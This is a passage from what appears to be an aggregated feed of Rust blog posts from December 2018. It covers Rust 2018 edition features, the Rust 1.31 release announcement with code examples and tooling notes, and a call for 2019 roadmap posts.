<p>Productivity also means not having to fix style nits (and never having to argue over formatting rules).</p>
<p>The rustfmt tool helps with this by automatically reformatting your code using a default code style (which the <a href="https://github.com/rust-lang/rfcs/pull/2436">community reached consensus</a> on). Using rustfmt ensures that all of your Rust code conforms to the same style, like clang format does for C++ and Prettier does for JavaScript.</p>
<h4>Clippy</h4>
<p>Sometimes it‚Äôs nice to have an experienced advisor by your side‚Ä¶ giving you tips on best practices as you code. That‚Äôs what Clippy does ‚Äîit reviews your code as you go and tells you how to make that code more idiomatic.</p>
<h4>rustfix</h4>
<p>But if you have an older code base that uses outmoded idioms, then just getting tips and correcting the code yourself can be tedious. You just want someone to go into your code base and make the corrections.</p>
<p>For these cases, rustfix will automate the process. It will both apply lints from tools like Clippy and update older code to match Rust 2018 idioms.</p>
<h3>Changes to Rust¬†itself</h3>
<p>These changes in the ecosystem have brought lots of productivity wins. But some productivity issues could only be fixed with changes to the language itself.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/04_01-language.png"><img alt="" class="alignnone size-large wp-image-33003" src="04_01-language-500x377.png" width="500" height="377" /></a></p>
<p>As I talked about in the intro, most of the language changes are completely compatible with existing Rust code. These changes are all part of Rust 2018. But because they don‚Äôt break any code, they also work in any Rust code‚Ä¶ even if that code doesn‚Äôt use Rust 2018.</p>
<p>Let‚Äôs look at a few of the big language features that were added to all editions. Then we can look at the small list of Rust 2018-specific features.</p>
<h4>New language features for all¬†editions</h4>
<p>Here‚Äôs a small sample of the big new language features that are (or will be) in all language editions.</p>
<h5><strong class="markup--strong markup--p-strong">More precise borrow checking (e.g. Non-Lexical Lifetimes)</strong></h5>
<p>One big selling point for Rust is the borrow checker. The borrow checker helps ensure that your code is memory safe. But it has also been a pain point for new Rust developers.</p>
<p>Part of that is learning new concepts. But there was another big part‚Ä¶ the borrow checker would sometimes reject code that seemed like it should work, even to those who understood the concepts.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/04_03-nll-01.png"><img alt="borrow checker telling a programmer that they can't borrow a variable because it's already borrowed" class="alignnone size-large wp-image-32994" src="04_03-nll-01-500x268.png" width="500" height="268" /></a></p>
<p>This is because the lifetime of a borrow was assumed to go all the way to the end of its scope‚Ää‚Äî‚Ääfor example, to the end of the function that the variable is in.</p>
<p>This meant that even though the variable was done with the value and wouldn‚Äôt try to access it anymore, other variables were still denied access to it until the end of the function.</p>
<p>To fix this, we‚Äôve made the borrow checker smarter. Now it can see when a variable is <em>actually</em> done using a value. If it is done, then it doesn‚Äôt block other borrowers from using the data.</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/04_04-nll-02.png"><img alt="borrow checker saying, Oh, now I see" class="alignnone size-large wp-image-32995" src="04_04-nll-02-500x303.png" width="500" height="303" /></a></p>
<p>While this is only available in Rust 2018 as of today, it will be available in all editions in the near future. I‚Äôll be writing more about all of this soon.</p>
<h5>Procedural macros on stable Rust</h5>
<p>Macros in Rust have been around since before Rust 1.0. But with Rust 2018, we‚Äôve made some big improvements, like introducing procedural macros.</p>
<p>With procedural macros, it‚Äôs kind of like you can add your own syntax to Rust.</p>
<p>Rust 2018 brings two kinds of procedural macros:</p>
<h5>Function-like macros</h5>
<p>Function-like macros allow you to have things that look like regular function calls, but that are actually run during compilation. They take in some code and spit out different code, which the compiler then inserts into the binary.</p>
<p>They‚Äôve been around for a while, but what you could do with them was limited. Your macro could only take the input code and run a match statement on it. It didn‚Äôt have access to look at all of the tokens in that input code.</p>
<p>But with procedural macros, you get the same input that a parser gets‚Ää‚Äî‚Ääa token stream. This means can create much more powerful function-like macros.</p>
<h5>Attribute-like macros</h5>
<p>If you‚Äôre familiar with decorators in languages like JavaScript, attribute macros are pretty similar. They allow you to annotate bits of code in Rust that should be preprocessed and turned into something else.</p>
<p>The <code>derive</code> macro does exactly this kind of thing. When you put derive above a struct, the compiler will take that struct in (after it has been parsed as a list of tokens) and fiddle with it. Specifically, it will add a basic implementation of functions from a trait.</p>
<h5>More ergonomic borrowing in matching</h5>
<p>This change is pretty straight-forward.</p>
<p>Before, if you wanted to borrow something and tried to match on it, you had to add some weird looking syntax:</p>
<p><a href="https://hacks.mozilla.org/files/2018/12/04_06-match.png"><img alt="Old version of the code with &amp;Some(ref s) next to new version with Some(s)" class="alignnone size-large wp-image-32996" src="04_06-match-500x162.png" width="500" height="162" /></a></p>
<p>But now, you don‚Äôt need the <code>&amp;Some(ref s)</code> anymore. You can just write <code>Some(s)</code>, and Rust will figure it out from there.</p>
<h4>New features specific to Rust¬†2018</h4>
<p>The smallest part of Rust 2018 are the features specific to it. Here are the small handful of changes that using the Rust 2018 edition unlocks.</p>
<h5>Keywords</h5>
<p>There are a few keywords that have been added to Rust 2018.</p>
<ul>
<li><code>try</code> keyword</li>
<li><code>async/await</code> keyword</li>
</ul>
<p>These features haven‚Äôt been fully implemented yet, but the keywords are being added in Rust 1.31. This means we don‚Äôt have to introduce new keywords (which would be a breaking change) in the future, once the features behind these keywords are implemented.</p>
<h5>The module system</h5>
<p>One big pain point for developers learning Rust is the module system. And we could see why. It was hard to reason about how Rust would choose which module to use.</p>
<p>To fix this, we made a few changes to the way paths work in Rust.</p>
<p>For example, if you imported a crate, you could use it in a path at the top level. But if you moved any of the code to a submodule, then it wouldn‚Äôt work anymore.</p>
<pre>// top level module
extern crate serde;

// this works fine at the top level
impl serde::Serialize for MyType { ... }

mod foo {
  // but it does *not* work in a sub-module
  impl serde::Serialize for OtherType { ... }
}</pre>
<p>Another example is the prefix¬†<code>::</code>, which used to refer to either the crate root or an external crate. It could be hard to tell which.</p>
<p>We‚Äôve made this more explicit. Now, if you want to refer to the crate root, you use the prefix <code>crate::</code> instead. And this is just one of the <a href="https://rust-lang-nursery.github.io/edition-guide/rust-2018/module-system/path-clarity.html">path clarity</a> improvements we‚Äôve made.</p>
<p>If you have existing Rust code and you want it to use Rust 2018, you‚Äôll very likely need to update it for these new module paths. But that doesn‚Äôt mean that you‚Äôll need to manually update your code. Run <code>cargo fix</code> before you add the edition specifier to Cargo.toml and <code>rustfix</code> will make all the changes for you.</p>
<h3>Learn More</h3>
<p>Learn all about this edition in the <a href="https://rust-lang-nursery.github.io/edition-guide/rust-2018/index.html">Rust 2018 edition guide</a>.</p>
<p>The post <a href="https://hacks.mozilla.org/2018/12/rust-2018-is-here/" rel="nofollow">Rust 2018 is here‚Ä¶ but what is it?</a> appeared first on <a href="https://hacks.mozilla.org/" rel="nofollow">Mozilla Hacks - the Web developer blog</a>.</p></div></div><div class="permalink"><a href="https://hacks.mozilla.org/2018/12/rust-2018-is-here/">by Lin Clark at <time datetime="2018-12-06T16:13:55Z" title="December 06, 2018 04:13 PM GMT">‰∏äÂçà12:13:55</time></a></div></div><h2><time datetime="2018-12-06">Thursday, 6 December 2018</time></h2><div class="news the-rust-programming-language-blog" xml:lang="en"><a id="news-45"></a><h3><a href="https://blog.rust-lang.org/" title="Rust Blog">The Rust Programming Language Blog</a> ‚Äî <a href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html">A call for Rust 2019 Roadmap blog posts</a></h3><div class="entry"><div class="content"><p>It's almost 2019! As such, the Rust team needs to create a roadmap for Rust's
development next year. At the highest level, Rust's development process looks
like this:</p>
<ol>
<li>The Rust community blogs about what they'd like to see.</li>
<li>The core team reads these posts, and produces a "roadmap RFC," a proposal
for what next year's development looks like.</li>
<li>The RFC is widely discussed, and modified in response to feedback, and
eventually accepted.</li>
<li>This RFC becomes a guideline for accepting or postponing RFCs for the next
year.</li>
</ol>
<p>We try to align this with the calendar year, but it doesn't 100% match up,
currently. Last year, <a href="https://blog.rust-lang.org/2018/01/03/new-years-rust-a-call-for-community-blogposts.html">we had a call for posts on January
3</a>,
the roadmap RFC was opened <a href="https://github.com/rust-lang/rfcs/pull/2314">on Jan
29th</a>, and was <a href="https://github.com/rust-lang/rfcs/pull/2314#issuecomment-370576889">accepted on
March
5th</a>.
This year, we're starting a bit earlier, but it's still not going to be
accepted before January 1.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html#we-need-you" id="we-need-you"></a>We need you</h3>
<p>Starting today and running until of January 15, we‚Äôd like to ask the
community to write blogposts reflecting on Rust in 2018 and proposing goals
and directions for Rust in 2019. Like last year, these can take many forms:</p>
<ul>
<li>A post on your personal or company blog</li>
<li>A Medium post</li>
<li>A GitHub gist</li>
<li>Or any other online writing platform you prefer.</li>
</ul>
<p>We‚Äôre looking for posts on many topics:</p>
<ul>
<li>Ideas for community programs</li>
<li>Language features</li>
<li>Documentation improvements</li>
<li>Ecosystem needs</li>
<li>Tooling enhancements</li>
<li>Or anything else Rust related you hope for in 2019</li>
</ul>
<p>There's one additional thing this year, however. With the shipping of Rust
2018 today, it's time to think about the next edition. In other words:</p>
<ul>
<li>Rust 2015: Stability</li>
<li>Rust 2018: Productivity</li>
<li>Rust 2021: ?</li>
</ul>
<p>We aren't yet <em>committing</em> to an edition in 2021, but that's the current
estimate. Each edition has had some sort of theme associated with it. As
such, we wouldn't just like to know what you're thinking for Rust in 2019,
but also, what you want the theme of Rust 2021 to be. Ideally, suggestions
for Rust in 2019 will fit into the overall goal of the next edition, though
of course, three years is a lot of time, and so not every single thing must.
As Rust matures, we need to start thinking of ever-longer horizons, and how
our current plans fit into those eventual plans.</p>
<p>If you're not sure what to write, check out all of the blog posts from last
year <a href="https://readrust.net/rust-2018/">over at ReadRust</a>. They may give you
some inspiration!</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html#please-share-these-posts-with-us" id="please-share-these-posts-with-us"></a>Please share these posts with us</h3>
<p>You can write up these posts and email them to <code>community@rust-lang.org</code> or
tweet them with the hashtag <code>#rust2019</code>.</p>
<p>The Core team will be reading all of the submitted posts and using them to
inform the initial roadmap RFC for 2019. Once the RFC is submitted, we‚Äôll
open up the normal RFC process, though if you want, you are welcome to write
a post and link to it on the GitHub discussion.</p>
<p>We look forward to working with the entire community to make Rust even more
wonderful in 2019. Thanks for an awesome 2018!</p></div></div><div class="permalink"><a href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html">by The Rust Core Team at <time datetime="2018-12-06T00:00:00Z" title="December 06, 2018 12:00 AM GMT">‰∏äÂçà8:00:00</time></a></div></div><div class="news the-rust-programming-language-blog" xml:lang="en"><a id="news-46"></a><h3><a href="https://blog.rust-lang.org/" title="Rust Blog">The Rust Programming Language Blog</a> ‚Äî <a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html">Announcing Rust 1.31 and Rust 2018</a></h3><div class="entry"><div class="content"><p>The Rust team is happy to announce a new version of Rust, 1.31.0, and "Rust
2018" as well. Rust is a programming language that empowers everyone to build
reliable and efficient software.</p>
<p>If you have a previous version of Rust installed via rustup, getting Rust
1.31.0 is as easy as:</p>
<pre><code class="language-bash">$ rustup update stable
</code></pre>
<p>If you don't have it already, you can <a href="https://www.rust-lang.org/tools/install">get <code>rustup</code></a> from the
appropriate page on our website, and check out the <a href="https://github.com/rust-lang/rust/blob/master/RELEASES.md#version-1310-2018-12-06">detailed release notes for
1.31.0</a> on GitHub.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#whats-in-1.31.0-stable" id="whats-in-1.31.0-stable"></a>What's in 1.31.0 stable</h3>
<p>Rust 1.31 may be the most exciting release since Rust 1.0! Included in this release is the
first iteration of "Rust 2018," but there's more than just that! This is going to be a long
post, so here's a table of contents:</p>
<ul>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#rust-2018">Rust 2018</a>
<ul>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#non-lexical-lifetimes">Non-lexical lifetimes</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#module-system-changes">Module system changes</a></li>
</ul>
</li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#more-lifetime-elision-rules">More lifetime elision rules</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#const-fn"><code>const fn</code></a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#new-tools">New tools</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#tool-lints">Tool Lints</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#documentation">Documentation</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#domain-working-groups">Domain working groups</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#new-website">New website</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#library-stabilizations">Library stabilizations</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#cargo-features">Cargo features</a></li>
<li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#contributors-to-131.0">Contributors</a></li>
</ul>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#rust-2018" id="rust-2018"></a>Rust 2018</h4>
<p>We wrote about Rust 2018 <a href="https://blog.rust-lang.org/2018/03/12/roadmap.html">first in
March</a>, <a href="https://blog.rust-lang.org/2018/07/27/what-is-rust-2018.html">and then in
July</a>.
For some more background about the <em>why</em> of Rust 2018, please go read those
posts; there's a lot to cover in the release announcement, and so we're going
to focus on the <em>what</em> here. There's also a <a href="https://hacks.mozilla.org/2018/12/rust-2018-is-here/">post on Mozilla Hacks</a> as
well!</p>
<p>Briefly, Rust 2018 is an opportunity to bring
all of the work we've been doing over the past three years together, and create
a cohesive package. This is more than just language features, it also includes</p>
<ul>
<li>Tooling (IDE support, <code>rustfmt</code>, Clippy)</li>
<li>Documentation</li>
<li>Domain working groups work</li>
<li>A new web site</li>
</ul>
<p>We'll be covering all of this and more in this post.</p>
<p>Let's create a new project with Cargo:</p>
<pre><code class="language-console">$ cargo new foo
</code></pre>
<p>Here's the contents of <code>Cargo.toml</code>:</p>
<pre><code class="language-toml">[package]
name = "foo"
version = "0.1.0"
authors = ["Your Name &lt;you@example.com&gt;"]
edition = "2018"

[dependencies]
</code></pre>
<p>A new key has been added under <code>[package]</code>: <code>edition</code>. Note that it has been
set to <code>2018</code>. You can also set it to <code>2015</code>, which is the default if the key
does not exist.</p>
<p>By using Rust 2018, some new features are unlocked that are not allowed in
Rust 2015.</p>
<p>It is important to note that each package can be in either 2015 or
2018 mode, and they work seamlessly together. Your 2018 project can use 2015
dependencies, and a 2015 project can use 2018 dependencies. This ensures that
we don't split the ecosystem, and all of these new things are opt-in,
preserving compatibility for existing code. Furthermore, when you do choose
to migrate Rust 2015 code to Rust 2018, the changes can be made
automatically, via <code>cargo fix</code>.</p>
<p>What kind of new features, you may ask? Well, first, features get added to
Rust 2015 unless they require some sort of incompatibility with 2015's
features. As such, most of the language is available everywhere. You can
check out <a href="https://doc.rust-lang.org/edition-guide">the edition
guide</a> to check each
feature's minimum <code>rustc</code> version as well as edition requirements. However,
there are a few big-ticket features we'd like to mention here: non-lexical
lifetimes, and some module system improvements.</p>
<h5><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#non-lexical-lifetimes" id="non-lexical-lifetimes"></a>Non-lexical lifetimes</h5>
<p>If you've been following Rust's development over the past few years, you may
have heard the term "NLL" or "non-lexical lifetimes" thrown around. This is
jargon, but it has a straightforward translation into simpler terms: the
borrow checker has gotten smarter, and now accepts some valid code that it
previously rejected. Consider this example:</p>
<pre><code class="language-rust">fn main() {
    let mut x = 5;

    let y = &amp;x;

    let z = &amp;mut x;
}
</code></pre>
<p>In older Rust, this is a compile-time error:</p>
<pre><code class="language-text">error[E0502]: cannot borrow `x` as mutable because it is also borrowed as immutable
 --&gt; src/main.rs:5:18
  |
4 |     let y = &amp;x;
  |              - immutable borrow occurs here
5 |     let z = &amp;mut x;
  |                  ^ mutable borrow occurs here
6 | }
  | - immutable borrow ends here
</code></pre>
<p>This is because lifetimes follow "lexical scope"; that is, the borrow from <code>y</code>
is considered to be held until <code>y</code> goes out of scope at the end of main, even
though we never use <code>y</code> again. This code is fine, but the borrow checker could
not handle it.</p>
<p>Today, this code will compile just fine.</p>
<p>What if we did use <code>y</code>, like this for example:</p>
<pre><code class="language-rust">fn main() {
    let mut x = 5;
    let y = &amp;x;
    let z = &amp;mut x;
    
    println!("y: {}", y);
}
</code></pre>
<p>Older Rust will give you this error:</p>
<pre><code class="language-text">error[E0502]: cannot borrow `x` as mutable because it is also borrowed as immutable
 --&gt; src/main.rs:5:18
  |
4 |     let y = &amp;x;
  |              - immutable borrow occurs here
5 |     let z = &amp;mut x;
  |                  ^ mutable borrow occurs here
...
8 | }
  | - immutable borrow ends here
</code></pre>
<p>With Rust 2018, this error changes for the better:</p>
<pre><code class="language-text">error[E0502]: cannot borrow `x` as mutable because it is also borrowed as immutable
 --&gt; src/main.rs:5:13
  |
4 |     let y = &amp;x;
  |             -- immutable borrow occurs here
5 |     let z = &amp;mut x;
  |             ^^^^^^ mutable borrow occurs here
6 |     
7 |     println!("y: {}", y);
  |                       - borrow later used here
</code></pre>
<p>Instead of pointing to where <code>y</code> goes out of scope, it shows you where the
conflicting borrow occurs. This makes these sorts of errors far easier to
debug.</p>
<p>In Rust 1.31, this feature is exclusive to Rust 2018. We plan to backport it
to Rust 2015 at a later date.</p>
<h5><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#module-system-changes" id="module-system-changes"></a>Module system changes</h5>
<p>The module system can be a struggle for people first learning Rust.
Everyone has their own things that take time to master, of course, but
there's a root cause for why it's so confusing to many: while there are
simple and consistent rules defining the module system, their consequences
can feel inconsistent, counterintuitive and mysterious.</p>
<p>As such, the 2018 edition of Rust introduces a few changes to how paths work,
but they end up simplifying the module system, to make it more clear as to
what is going on.</p>
<p>Here's a brief summary:</p>
<ul>
<li><code>extern crate</code> is no longer needed in almost all circumstances.</li>
<li>You can import macros with <code>use</code>, rather than a <code>#[macro_use]</code> attribute.</li>
<li>Absolute paths begin with a crate name, where the keyword <code>crate</code> refers to the current crate.</li>
<li>A <code>foo.rs</code> and <code>foo/</code> subdirectory may coexist; <code>mod.rs</code> is no longer needed when placing submodules in a subdirectory.</li>
</ul>
<p>These may seem like arbitrary new rules when put this way, but the mental
model is now significantly simplified overall.</p>
<p>There's a <em>lot</em> of details here, so please read <a href="https://doc.rust-lang.org/edition-guide/rust-2018/module-system/path-clarity.html">the edition
guide</a>
for full details.</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#more-lifetime-elision-rules" id="more-lifetime-elision-rules"></a>More lifetime elision rules</h4>
<p>Let's talk about a feature that's available in both editions: we've added
some additional elision rules for <code>impl</code> blocks and function definitions.
Code like this:</p>
<pre><code class="language-rust">impl&lt;'a&gt; Reader for BufReader&lt;'a&gt; {
    // methods go here
}
</code></pre>
<p>can now be written like this:</p>
<pre><code class="language-rust">impl Reader for BufReader&lt;'_&gt; {
    // methods go here
}
</code></pre>
<p>The <code>'_</code> lifetime still shows that <code>BufReader</code> takes a parameter, but we
don't need to create a name for it anymore.</p>
<p>Lifetimes are still required to be defined in structs. However, we no longer
require as much boilerplate as before:</p>
<pre><code class="language-rust">// Rust 2015
struct Ref&lt;'a, T: 'a&gt; {
    field: &amp;'a T
}

// Rust 2018
struct Ref&lt;'a, T&gt; {
    field: &amp;'a T
}
</code></pre>
<p>The <code>: 'a</code> is inferred. You can still be explicit if you prefer. We're
considering some more options for elision here in the future, but have no
concrete plans yet.</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#const-fn" id="const-fn"></a><code>const fn</code></h4>
<p>There's several ways to define a function in Rust: a regular function with
<code>fn</code>, an unsafe function with <code>unsafe fn</code>, an external function with <code>extern fn</code>.
This release adds a new way to qualify a function: <code>const fn</code>. It looks like
this:</p>
<pre><code class="language-rust">const fn foo(x: i32) -&gt; i32 {
    x + 1
}
</code></pre>
<p>A <code>const fn</code> can be called like a regular function, but it can also be used
in any constant context. When it is, it is evaluated at compile time, rather
than at run time. As an example:</p>
<pre><code class="language-rust">const SIX: i32 = foo(5);
</code></pre>
<p>This will execute <code>foo</code> at compile time, and set <code>SIX</code> to <code>6</code>.</p>
<p><code>const fn</code>s cannot do everything that normal <code>fn</code>s can do; they must
have deterministic output. This is important for soundness reasons.
Currently, <code>const fn</code>s can do a minimal subset of operations. Here's
some examples of what you can do:</p>
<ul>
<li>Arithmetic and comparison operators on integers</li>
<li>All boolean operators except for <code>&amp;&amp;</code> and <code>||</code></li>
<li>Constructing arrays, structs, enums, and tuples</li>
<li>Calls to other <code>const fn</code>s</li>
<li>Index expressions on arrays and slices</li>
<li>Field accesses on structs and tuples</li>
<li>Reading from constants (but not statics, not even taking a reference to a static)</li>
<li><code>&amp;</code> and <code>*</code> of references</li>
<li>Casts, except for raw pointer to integer casts</li>
</ul>
<p>We'll be growing the abilities of <code>const fn</code>, but we've decided that
this is enough useful stuff to start shipping the feature itself.</p>
<p>For full details, please see <a href="https://doc.rust-lang.org/reference/items/functions.html#const-functions">the
reference</a>.</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#new-tools" id="new-tools"></a>New tools</h4>
<p>The 2018 edition signals a new level of maturity for Rust's tools ecosystem.
Cargo, Rustdoc, and Rustup have been crucial tools since 1.0; with the 2018
edition, there is a new generation of tools ready for all users: Clippy,
Rustfmt, and IDE support.</p>
<p>Rust's linter, <a href="https://github.com/rust-lang/rust-clippy/"><code>clippy</code></a>, is
now available on stable Rust. You can install it via <code>rustup component add clippy</code> and run it with <code>cargo clippy</code>. Clippy is now considered 1.0, which
carries the same lint stability guarantees as rustc. New lints may be added,
and lints may be modified to add more functionality, however lints may never
be removed (only deprecated). This means that code that compiles under clippy
will continue to compile under clippy (provided there are no lints set to
error via <code>deny</code>), but may throw new warnings.</p>
<p><a href="https://github.com/rust-lang/rustfmt">Rustfmt</a> is a tool for formatting Rust
code. Automatically formatting your code lets you save time and arguments by
using the <a href="https://github.com/rust-lang/rfcs/blob/master/style-guide/README.md">official Rust
style</a>.
You can install with <code>rustup component add rustfmt</code> and use it with <code>cargo fmt</code>.</p>
<p>This release includes Rustfmt 1.0. From now on we guarantee backwards
compatibility for Rustfmt: if you can format your code today, then the
formatting will not change in the future (only with the default options).
Backwards compatibility means that running Rustfmt on your CI is practical
(use <code>cargo fmt -- --check</code>). Try that and 'format on save' in your editor to
revolutionize your workflow.</p>
<p>IDE support is one of the most requested tooling features for Rust. There are
now multiple, high quality options:</p>
<ul>
<li><a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust">Visual Studio Code</a></li>
<li><a href="https://plugins.jetbrains.com/plugin/8182-rust">IntelliJ</a></li>
<li><a href="https://github.com/rust-lang-nursery/atom-ide-rust">Atom</a></li>
<li><a href="https://github.com/rust-lang/rust-enhanced">Sublime Text 3</a></li>
<li><a href="https://www.eclipse.org/downloads/packages/release/photon/r/eclipse-ide-rust-developers-includes-incubating-components">Eclipse</a></li>
</ul>
<p>Work on IDE support is not finished, in particular code completion is not up
to scratch in the RLS-based editors. However, if you mainly want support for
types, documentation, and 'go to def', etc. then you should be happy.</p>
<p>If you have problems installing any of the tools with Rustup, try running
<code>rustup self update</code>, and then try again.</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#tool-lints" id="tool-lints"></a>Tool lints</h4>
<p>In <a href="https://blog.rust-lang.org/2018/10/25/Rust-1.30.0.html">Rust 1.30</a>, we
stabilized "tool attributes", like <code>#[rustfmt::skip]</code>. In Rust 1.31, we're
stabilizing something similar: "tool lints," like
<code>#[allow(clippy::bool_comparison)]</code> These give a namespace to lints, so that it's
more clear which tool they're coming from.</p>
<p>If you previously used Clippy's lints, you can migrate like this:</p>
<pre><code class="language-rust">// old
#![cfg_attr(feature = "cargo-clippy", allow(bool_comparison))]

// new
#![allow(clippy::bool_comparison)]
</code></pre>
<p>You don't need <code>cfg_attr</code> anymore! You'll also get warnings that can help you
update to the new style.</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#documentation" id="documentation"></a>Documentation</h4>
<p>Rustdoc has seen a number of improvements this year, and we also shipped a
complete re-write of the "The Rust Programming Language." Additionally, you
can <a href="https://nostarch.com/rust">buy a dead-tree copy from No Starch Press</a>!</p>
<p>We had previously called this the "second edition" of the book, but since
it's the first edition in print, that was confusing. We also want to
periodically update the print edition as well. In the end, after many
discussions with No Starch, we're going to be updating the book on the
website with each release, and No Starch will periodically pull in our
changes and print them. The book has been selling quite well so far, raising
money for <a href="http://www.blackgirlscode.com/">Black Girls Code</a>.</p>
<p>You can find the new TRPL <a href="https://doc.rust-lang.org/beta/book/">here</a>.</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#domain-working-groups" id="domain-working-groups"></a>Domain working groups</h4>
<p>We announced the formation of four working groups this year:</p>
<ul>
<li>Network services</li>
<li>Command-line applications</li>
<li>WebAssembly</li>
<li>Embedded devices</li>
</ul>
<p>Each of these groups has been working very hard on a number of things to
make Rust awesome in each of these domains. Some highlights:</p>
<ul>
<li>Network services has been shaking out the Futures interface, and async/await
on top of it. This hasn't shipped yet, but we're close!</li>
<li>The CLI working group has been working on libraries and documentation for making awesome
command-line applications</li>
<li>The WebAssembly group has been shipping a ton of world-class tooling for using Rust with wasm.</li>
<li>Embedded devices has gotten ARM development working on stable Rust!</li>
</ul>
<p>You can find out more about this work on the new website!</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#new-website" id="new-website"></a>New Website</h4>
<p><a href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html">Last
week</a>
we announced a new iteration of the web site. It's now been promoted to
rust-lang.org itself!</p>
<p>There's still a ton of work to do, but we're proud of the year of work that it
took by many people to get it shipped.</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#library-stabilizations" id="library-stabilizations"></a>Library stabilizations</h4>
<p>A bunch of <code>From</code> implementations have been added:</p>
<ul>
<li><code>u8</code> now implements <code>From&lt;NonZeroU8&gt;</code>, and likewise for the other numeric types and their <code>NonZero</code> equivalents</li>
<li><code>Option&lt;&amp;T&gt;</code> implements <code>From&lt;&amp;Option&lt;T&gt;&gt;</code>, and likewise for <code>&amp;mut</code></li>
</ul>
<p>Additionally, these functions have been stabilized:</p>
<ul>
<li><a href="https://doc.rust-lang.org/std/primitive.slice.html#method.align_to"><code>slice::align_to</code></a> and its mutable counterpart</li>
<li><a href="https://doc.rust-lang.org/std/primitive.slice.html#method.chunks_exact"><code>slice::chunks_exact</code></a>,
as well as its mutable and <code>r</code> counterparts (like
<a href="https://doc.rust-lang.org/std/primitive.slice.html#method.rchunks_mut"><code>slice::rchunks_exact_mut</code></a>) in all combinations</li>
</ul>
<p>See the <a href="https://github.com/rust-lang/rust/blob/master/RELEASES.md#version-1310-2018-12-06">detailed release notes</a> for more.</p>
<h4><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#cargo-features" id="cargo-features"></a>Cargo features</h4>
<p>Cargo will now download packages in parallel using HTTP/2.</p>
<p>Additionally, now that <code>extern crate</code> is not usually required, it would be
jarring to do <code>extern crate foo as bar;</code> to rename a crate. As such, you can
do so in your <code>Cargo.toml</code>, like this:</p>
<pre><code class="language-toml">[dependencies]
baz = { version = "0.1", package = "foo" }
</code></pre>
<p>or, the equivalent</p>
<pre><code class="language-toml">[dependencies.baz]
version = "0.1"
package = "foo"
</code></pre>
<p>Now, the <code>foo</code> package will be able to be used via <code>baz</code> in your code.</p>
<p>See the <a href="https://github.com/rust-lang/rust/blob/master/RELEASES.md#version-1310-2018-12-06">detailed release notes</a> for more.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html#contributors-to-131.0" id="contributors-to-131.0"></a>Contributors to 1.31.0</h3>
<p>At the end of release posts, we normally thank <a href="https://thanks.rust-lang.org/rust/1.31.0">the people who contributed to
this release</a>. But for this
release, more so than others, this list does not truly capture the amount of
work and the number of people who have contributed. Each release is only six
weeks, but this release is the culmination of three years of effort, in
countless repositories, by numerous people. It's been a pleasure to work with
you all, and we look forward to continuing to grow in the next three years.</p></div></div><div class="permalink"><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html">by The Rust Core Team at <time datetime="2018-12-06T00:00:00Z" title="December 06, 2018 12:00 AM GMT">‰∏äÂçà8:00:00</time></a></div></div><h2><time datetime="2018-12-04">Tuesday, 4 December 2018</time></h2><div class="news the-servo-blog"><a id="news-47"></a><h3><a href="https://blog.servo.org/" title="Servo Blog">The Servo Blog</a> ‚Äî <a href="https://blog.servo.org/2018/12/04/magicleap/">Experience porting Servo to the Magic Leap One</a></h3><div class="entry"><div class="content"><h3>Introduction</h3>

<p>We now have nightly releases of Servo for the Magic Leap One augmented reality headset.
You can head over to <a href="https://download.servo.org/">https://download.servo.org/</a>, install the
application, and browse the web in a virtual browser.</p>

